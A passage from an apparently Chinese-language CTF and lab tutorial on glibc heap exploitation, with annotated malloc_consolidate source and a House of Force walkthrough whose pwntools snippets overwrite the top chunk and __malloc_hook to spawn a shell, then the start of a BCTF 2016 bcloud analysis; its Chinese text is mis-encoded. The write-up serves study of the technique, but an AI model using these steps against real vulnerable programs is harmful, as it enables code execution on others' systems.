class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span> &#123;<br>    mfastbinptr *fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>    mfastbinptr *maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>    mchunkptr p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>    mchunkptr nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>    mchunkptr unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>    mchunkptr first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>    <span class="hljs-comment">/* These have same use as in free() */</span><br>    mchunkptr nextchunk;<br>    INTERNAL_SIZE_T size;<br>    INTERNAL_SIZE_T nextsize;<br>    INTERNAL_SIZE_T prevsize;<br>    <span class="hljs-type">int</span> nextinuse;<br>    mchunkptr bck;<br>    mchunkptr fwd;<br><br>    <span class="hljs-comment">// æ¸…é™¤ have_fastchunks æ ‡å¿—ä½</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">// æ‹¿åˆ° unsorted_bin</span><br>    unsorted_bin = unsorted_chunks(av);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">      then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">      placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">      reused anyway.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// æ‹¿åˆ°æœ€å¤§çš„ fastbin entry åœ°å€</span><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// æ‹¿åˆ°æœ€å°çš„ fastbin entry åœ°å€</span><br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">// æ›¿æ¢ p çš„å€¼ä¸º fb</span><br>        p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-comment">// å¦‚æœ p ä¸ä¸º null</span><br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">do</span> &#123;<br>                &#123;<br>                    <span class="hljs-comment">// æ ¹æ® size æ‹¿åˆ°å¯¹åº”çš„ fastbin ç´¢å¼•</span><br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index (chunksize(p));<br>                    <span class="hljs-comment">// å¦‚æœä¸åŒ¹é…</span><br>                    <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>                        malloc_printerr(<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// å•¥ä¹Ÿæ²¡å¹²</span><br>                check_inuse_chunk(av, p);<br>                <span class="hljs-comment">// æ‹¿åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ </span><br>                nextp = p-&gt;fd;<br><br>                <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>                <span class="hljs-comment">// æ‹¿åˆ°size</span><br>                size = chunksize (p);<br>                <span class="hljs-comment">// æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk ï¼ˆç‰©ç†æ„ä¹‰ï¼‰</span><br>                nextchunk = chunk_at_offset(p, size);<br>                <span class="hljs-comment">// æ‹¿åˆ°ä¸‹ä¸€ä¸ª chunk ï¼ˆç‰©ç†æ„ä¹‰ï¼‰çš„ size</span><br>                nextsize = chunksize(nextchunk);<br>                <span class="hljs-comment">// å¦‚æœå‰ä¸€ä¸ª chunk ä¸ºé‡Šæ”¾çŠ¶æ€</span><br>                <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                    prevsize = prev_size (p);<br>                    size += prevsize;<br>                    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>                    unlink(av, p, bck, fwd);<br>                &#125;<br>                <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª ä¸æ˜¯ top_chunk</span><br>                <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>                    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                        size += nextsize;<br>                        unlink(av, nextchunk, bck, fwd);<br>                    &#125; <span class="hljs-keyword">else</span><br>                        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                    <span class="hljs-comment">// æ‹¿åˆ° unsorted_bin çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span><br>                    first_unsorted = unsorted_bin-&gt;fd;<br>                    <span class="hljs-comment">// è¿›è¡Œé“¾æ¥</span><br>                    unsorted_bin-&gt;fd = p;<br>                    first_unsorted-&gt;bk = p;<br><br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>                        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br><br>                    set_head(p, size | PREV_INUSE);<br>                    p-&gt;bk = unsorted_bin;<br>                    p-&gt;fd = first_unsorted;<br>                    set_foot(p, size);<br>                &#125;<br>                <span class="hljs-comment">// ä¸‹ä¸€ä¸ª chunk æ˜¯ top_chunk</span><br>                <span class="hljs-keyword">else</span> &#123;<br>                    size += nextsize;<br>                    set_head(p, size | PREV_INUSE);<br>                    av-&gt;top = p;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br><br>        &#125;<br>    <span class="hljs-comment">// éå†</span><br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Flowchart"><a href="#Flowchart" class="headerlink" title="Flowchart"></a>Flowchart</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p><img src="Heap.assets/image-20221018211322536.png" srcset="/img/loading.gif" lazyload alt="image-20221018211322536"></p>
<h4 id="sysmalloc-1"><a href="#sysmalloc-1" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><p><img src="Heap.assets/image-20221018211539984.png" srcset="/img/loading.gif" lazyload alt="image-20221018211539984"></p>
<h4 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h4><p><img src="Heap.assets/image-20221018211632490.png" srcset="/img/loading.gif" lazyload alt="image-20221018211632490"></p>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p><img src="Heap.assets/image-20221018211608180.png" srcset="/img/loading.gif" lazyload alt="image-20221018211608180"></p>
<h2 id="Basic-Vulnerable"><a href="#Basic-Vulnerable" class="headerlink" title="Basic Vulnerable"></a>Basic Vulnerable</h2><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><h4 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>ç”¨ä¸€ä¸ªè¾ƒå¤§çš„å€¼æ¥é‡å†™top_chunkçš„å¤§å°å­—æ®µï¼Œç„¶åè¯·æ±‚è¶³å¤Ÿçš„å†…å­˜æ¥å¼¥è¡¥é¡¶å—å’Œç›®æ ‡æ•°æ®ä¹‹é—´çš„å·®è· ã€‚ä»¥è¿™ç§æ–¹å¼è¿›è¡Œçš„åˆ†é…å¯ä»¥ç¯ç»•VAç©ºé—´ï¼Œä½¿å¾—è¿™ç§æŠ€æœ¯å¯ä»¥ä»¥æ¯”å †æ›´ä½çš„åœ°å€ä¸ºç›®æ ‡åœ°å€ã€‚</p>
<h4 id="è¯¦æƒ…"><a href="#è¯¦æƒ…" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p>åœ¨GLIBCç‰ˆæœ¬&lt;2.29ä¸­ï¼Œtop chunk å¤§å°å­—æ®µåœ¨åˆ†é…æœŸé—´ä¸å—ä»»ä½•å®Œæ•´æ€§æ£€æŸ¥ã€‚å¦‚æœä¸€ä¸ªtop chunkå¤§å° çš„å­—æ®µè¢«è¦†ç›–ï¼Œä¾‹å¦‚æº¢å‡ºå¹¶è¢«æ›¿æ¢æˆä¸€ä¸ªå¤§çš„å€¼ï¼Œé‚£ä¹ˆä»è¯¥top chunkçš„åç»­åˆ†é…å¯èƒ½ä¼šä¸ä½¿ç”¨ä¸­çš„å†…å­˜é‡å ã€‚åœ¨GLIBC&lt;2.30çš„ç‰ˆæœ¬ä¸­ï¼Œä»ä¸€ä¸ªè¢«ç ´åçš„top chunkä¸­åˆ†é…çš„éå¸¸å¤§çš„å†…å­˜å¯ä»¥ç¯ç»•VAç©ºé—´ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸€ä¸ªtop chunk ä»åœ°å€0x405000å¼€å§‹ï¼Œé©»ç•™åœ¨ç¨‹åºæ•°æ®éƒ¨åˆ†çš„åœ°å€0x404000çš„ç›®æ ‡æ•°æ®å¿…é¡»è¢«è¦†ç›–ã€‚ä½¿ç”¨æº¢å‡ºè¦†ç›–é¡¶top chunk å¤§å°å­—æ®µï¼Œå°†å…¶æ›¿æ¢ä¸º0xffffffffffffff1çš„å€¼ã€‚æ¥ä¸‹æ¥ï¼Œè®¡ç®—å°†top chunk ç§»åŠ¨åˆ°ç›®æ ‡ä¹‹å‰çš„åœ°å€æ‰€éœ€çš„å­—èŠ‚æ•°ã€‚æ€»æ•°æ˜¯0xffffffffffffffffff-0x405000å­—èŠ‚ï¼Œä»¥è¾¾åˆ°VAç©ºé—´çš„æœ«ç«¯ï¼Œç„¶åæ˜¯0x404000-0x20ä¸ªå­—èŠ‚ï¼Œä»¥åœ¨ç›®æ ‡åœ°å€ä¹‹å‰åœæ­¢ã€‚<br>åœ¨è¿™ä¸ªè¯·æ±‚top chunkå¾—åˆ°æœåŠ¡åï¼Œä¸‹ä¸€ä¸ªç”³è¯·çš„å—å°†ä¸ç›®æ ‡æ•°æ®é‡å ã€‚</p>
<h4 id="é™åˆ¶æ¡ä»¶"><a href="#é™åˆ¶æ¡ä»¶" class="headerlink" title="é™åˆ¶æ¡ä»¶"></a>é™åˆ¶æ¡ä»¶</h4><ul>
<li><p>GLIBC 2.29ç‰ˆå¼•å…¥äº†é¡¶éƒ¨å—å¤§å°å­—æ®µçš„åˆç†æ€§æ£€æŸ¥ã€‚<a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45">link</a></p>
<p><img src="Heap.assets/image-20220814132821567.png" srcset="/img/loading.gif" lazyload alt="image-20220814132821567"></p>
</li>
<li><p>GLIBC 2.30ç‰ˆå¼•å…¥äº†æœ€å¤§åˆ†é…å¤§å°æ£€æŸ¥ï¼Œå®ƒé™åˆ¶äº† house of forceâ€å¯ä»¥å¼¥è¡¥çš„å·®è·å¤§å°ã€‚<a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=0e3d4dd5163f5fa8fb07b71fb7e318e7b10f5cfd;hp=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hb=9bf8e29ca136094f73f69f725f15c51facc97206;hpb=52faba65f84ee5a8d82ff813bcfa0ee5f4d480cf">link</a></p>
<p><img src="Heap.assets/image-20220814133216729.png" srcset="/img/loading.gif" lazyload alt="image-20220814133216729"></p>
</li>
</ul>
<h4 id="ç¤ºä¾‹ä¸€ï¼šhouse-of-force"><a href="#ç¤ºä¾‹ä¸€ï¼šhouse-of-force" class="headerlink" title="ç¤ºä¾‹ä¸€ï¼šhouse_of_force"></a>ç¤ºä¾‹ä¸€ï¼šhouse_of_force</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/house_of_force/house_of_force">house_of_force</a></p>
</blockquote>
<h5 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h5><ul>
<li>ä¿®æ”¹targetçš„å€¼</li>
<li>è·å–shell</li>
</ul>
<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/house_of_force]<br>â””â”€$ checksec house_of_force                                 <br>[*] &#x27;/home/fanya/Desktop/heap/heaplab/part1/house_of_force/house_of_force&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  &#x27;../.glibc/glibc_2.28_no-tcache&#x27;<br></code></pre></td></tr></table></figure>

<h5 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>ç¨‹åºåœ¨è¿è¡Œæ—¶å·²ç»™å‡ºlibcåœ°å€åŠheapåœ°å€ã€‚</p>
<p>åœ¨<code>read(0, m_array[index++], v5 + 8);</code>ä¸­æ˜æ˜¾çš„æº¢å‡º8ä¸ªå­—èŠ‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *m; <span class="hljs-comment">// [rsp+18h] [rbp-38h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  House of Force&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  m = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x88</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap @ %p\n&quot;</span>, m - <span class="hljs-number">16</span>);<br>  <span class="hljs-built_in">free</span>(m);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">4LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) target&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ntarget: %s\n&quot;</span>, target);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        v4 = read_num();<br>        m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v4);<br>        <span class="hljs-keyword">if</span> ( m_array[index] )<br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>          v5 = malloc_usable_size(m_array[index]);<br>          read(<span class="hljs-number">0</span>, m_array[index++], v5 + <span class="hljs-number">8</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><ul>
<li>ç”±äºå †ä¸Šè¾“å…¥çš„æ—¶å€™æ°æœ‰8ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œä¿®æ”¹top_chunkï¼Œä»è€Œè¾¾åˆ°ä»»æ„åœ°å€å†™ã€‚</li>
<li>ä¿®æ”¹__malloc_hook ä¸ºsystemçš„åœ°å€ã€‚</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ä½¿ç”¨8å­—èŠ‚æº¢å‡ºä¿®æ”¹top_chunkçš„sizeä¸º0xffffffffffffffff</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(<span class="hljs-number">24</span>, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">24</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)) <br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220816100317563.png" srcset="/img/loading.gif" lazyload alt="image-20220816100317563"></p>
</li>
<li><p>è®¡ç®—ä¸ç›®æ ‡åœ°å€çš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Calculate the &quot;wraparound&quot; distance between two addresses.                                             </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delta</span>(<span class="hljs-params">x, y</span>):<br>	<span class="hljs-keyword">return</span> (<span class="hljs-number">0xffffffffffffffff</span> - x) + y <br>distance = delta(heap + <span class="hljs-number">0x20</span>, elf.sym.target - <span class="hljs-number">0x20</span>)<br><span class="hljs-comment"># heap -&gt; heap addr 0x20 -&gt;first chunk size</span><br>distance = (libc.sym.__malloc_hook - <span class="hljs-number">0x20</span>) - (heap + <span class="hljs-number">0x20</span>)<br></code></pre></td></tr></table></figure></li>
<li><p>åˆ›å»ºchunkï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™</p>
<ul>
<li><p>modify_target</p>
<pre><code class="hljs"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(distance, <span class="hljs-string">b&quot;a&quot;</span>)<br>malloc(<span class="hljs-number">24</span>, <span class="hljs-string">b&#x27;aaaaaaa&#x27;</span>)<br></code></pre></td></tr></table></figure>
</code></pre>
<p>  <img src="Heap.assets/image-20220816100752788.png" srcset="/img/loading.gif" lazyload alt="image-20220816100752788"></p>
</li>
<li><p>drop shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">malloc(distance, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>malloc(<span class="hljs-number">24</span>, p64(libc.sym.system))<br>cmd = heap + <span class="hljs-number">0x30</span><br>malloc(cmd, <span class="hljs-string">b&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220816101120303.png" srcset="/img/loading.gif" lazyload alt="image-20220816101120303"></p>
</li>
</ul>
</li>
</ul>
<h4 id="ç¤ºä¾‹äºŒï¼šBCTF-2016-bcloud"><a href="#ç¤ºä¾‹äºŒï¼šBCTF-2016-bcloud" class="headerlink" title="ç¤ºä¾‹äºŒï¼šBCTF 2016  bcloud"></a>ç¤ºä¾‹äºŒï¼šBCTF 2016  bcloud</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/bctf_2016_bcloud/bcloud">bcloud</a></p>
</blockquote>
<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½-1"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½-1" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><p><img src="Heap.assets/image-20220814164430494.png" srcset="/img/loading.gif" lazyload alt="image-20220814164430494"></p>
<h5 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><ul>
<li><p>å°†ç¨‹åºæ‰“å®Œæ³¨é‡Šåä¸º<a href="attachment/bctf_2016_bcloud/bcloud.idb">bcloud.idb</a></p>
</li>
<li><p>åœ¨<code>my_input</code>å‡½æ•°ä¸­åœ¨æœ«å°¾ a2 çš„ä½ç½®åŠ å…¥ä¸€ä¸ª<code>\x00</code>, è€Œåœ¨name_initä¸­sæœ¬ä¸º64çš„å¤§å°ï¼Œ<code>my_input</code>ä¹Ÿæ˜¯64ï¼Œä½†ä¼šåœ¨65çš„ä½ç½®åŠ ä¸€ä¸ª<code>\x00</code>, ä½†æ˜¯ç”±äºåé¢çš„v2èµ‹å€¼çš„æ“ä½œï¼Œå°†<code>\x00</code>è¦†ç›–ä¸ºäº†åˆ«çš„å€¼ï¼Œè€Œä¸”ä¼šåœ¨åé¢çš„<code>some_output</code>æ³„éœ²å‡ºv2çš„å †åœ°å€ã€‚ç”±äºå­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿—ä¸º<code>\x00</code>ï¼Œæ‰€ä»¥<code>strcpy </code>å’Œ <code>puts</code> å‡½æ•°éƒ½ä¼šå¯¹è¿™ä¸ªv2çš„å †åœ°å€è¿›è¡Œæ“ä½œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">my_input</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">char</span> a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+1Bh] [ebp-Dh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1u</span>) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(_BYTE *)(a1 + i) = buf;<br>  &#125;<br>  *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">name_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+5Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span 